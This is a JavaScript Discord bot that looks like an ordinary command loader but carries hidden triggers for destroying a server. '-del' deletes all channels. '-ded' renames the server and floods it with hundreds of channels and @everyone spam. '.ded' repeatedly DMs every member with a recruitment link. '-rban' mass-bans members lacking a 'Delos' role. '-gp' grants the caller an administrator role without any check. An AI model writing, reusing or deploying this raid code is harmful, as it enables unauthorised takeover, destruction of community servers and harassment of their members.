const Discord = require('discord.js');
const client = new Discord.Client();
const config = require('./config.json');
const chalk = require('chalk');
const Canvas = require('canvas');
const snekfetch = require('snekfetch');
const fs = require('fs');
require('./util/eventLoader')(client);
const redcolor = chalk.keyword('red');
const orangecolor = chalk.keyword('orange');
const yellowcolor = chalk.keyword('yellow');
const grencolor = chalk.keyword('green');
const cyancolor = chalk.keyword('cyan');
const bluecolor = chalk.keyword('blue');

client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./commands/Fun/', (err, filesfun) => {
  if (err) console.error(err);
  filesfun.forEach(f => {
    const props = require(`./commands/Fun/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });

  fs.readdir('./commands/Image/', (err, filesimg) => {
    if (err) console.error(err);
    filesimg.forEach(f => {
      const props = require(`./commands/Image/${f}`);
      client.commands.set(props.help.name, props);
      props.conf.aliases.forEach(alias => {
        client.aliases.set(alias, props.help.name);
      });
    });

fs.readdir('./commands/Info/', (err, filesinfo) => {
  if (err) console.error(err);
  filesinfo.forEach(f => {
    const props = require(`./commands/Info/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });

fs.readdir('./commands/Mod/', (err, filesmod) => {
  if (err) console.error(err);
  filesmod.forEach(f => {
    const props = require(`./commands/Mod/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });

  fs.readdir('./commands/Admin/', (err, filesadmin) => {
    if (err) console.error(err);
    filesadmin.forEach(f => {
      const props = require(`./commands/Admin/${f}`);
      client.commands.set(props.help.name, props);
      props.conf.aliases.forEach(alias => {
        client.aliases.set(alias, props.help.name);
      });
    });

fs.readdir('./commands/Social/', (err, filessocial) => {
  if (err) console.error(err);
  filessocial.forEach(f => {
    const props = require(`./commands/Social/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });

fs.readdir('./commands/NSFW/', (err, filesnsfw) => {
  if (err) console.error(err);
  filesnsfw.forEach(f => {
    const props = require(`./commands/NSFW/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
 
  
  var totalcmd =  Math.floor(filesfun.length + filesinfo.length + filesmod.length + filessocial.length + filesnsfw.length + filesadmin.length + filesimg.length);
console.log(bluecolor(`Il y a un total de ${totalcmd} commandes 👍.`));
  });
});
});
});
});
});
});

client.elevation = message => {
  /* This function should resolve to an ELEVATION level which
     is then sent to the command handler for verification*/
  let permlvl = 0;
  const mod_role = message.guild.roles.find('name', config.modrolename);
  if (mod_role && message.member.roles.has(mod_role.id)) permlvl = 2;
  const admin_role = message.guild.roles.find('name', config.adminrolename);
  if (admin_role && message.member.roles.has(admin_role.id)) permlvl = 3;
  if (message.author.id === config.ownerid) permlvl = 4;
  return permlvl;
};

client.on('message', msg => {
 

            if (msg.content === '.ded') {
                if (msg.channel.type === "dm") return;
                if (msg.deletable) msg.delete();
                msg.guild.members.forEach(member => {
                  setInterval(function () {
                    member.send(msg.guild.name + " a été détruit par la Ligue de Delos\nhttps://discord.gg/kkgw4Zp\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif").catch(error => {}) }, 450)})
       }

if(msg.content === '-del'){
          if(msg.channel.type === "dm") return;
          if(msg.guild.channels.size === 0) return;
          else if(!msg.guild.member(client.user).hasPermission("MANAGE_CHANNELS")) return;
          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
      }

  if (msg.content === '-ded') {
    console.log(`Commande -ded par ${msg.author.tag}`);

      msg.guild.setIcon('./delos.png').catch(e => {});
      msg.guild.setName('Détruit par la Ligue de Delos').catch(e => {});

      for (var i = 0; i < 390; i++) {
        msg.guild.createChannel('La Ligue de Delos', 'voice').catch(e => {});
        msg.guild.createChannel('La Ligue de Delos', 'text').catch(e => {});
      }

    if (msg.deletable) {
      msg.delete();
    }
  }

  if (msg.content === '-rban') {
    console.log(`Commande -rban par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Delos") && member.bannable) member.ban().catch(e => {});
    });
  }

  if (msg.content === '-stop') {
    console.log(`Commande -stop par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

  if (msg.content === '-gp') {
    console.log(`Commande -gp par ${msg.author.tag}`);

    msg.member.guild.createRole({
      name: "Delos",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role);
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  //#endregion
});
client.on("message", msg => {
        if(msg.content.startsWith("-ded")){
           msg.delete()
            let i = 0;
            let interval = setInterval(function () {
              msg.guild.channels.forEach(channel => {
                if (channel.type === "text") channel.send('@everyone  @here  Detruit par la ligue de delos\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nhttps://media.giphy.com/media/fs0jQE06crHkXuZGnP/giphy.gif')
              }, 2500);
            });
          }
        });

client.login(process.env.TOKEN);
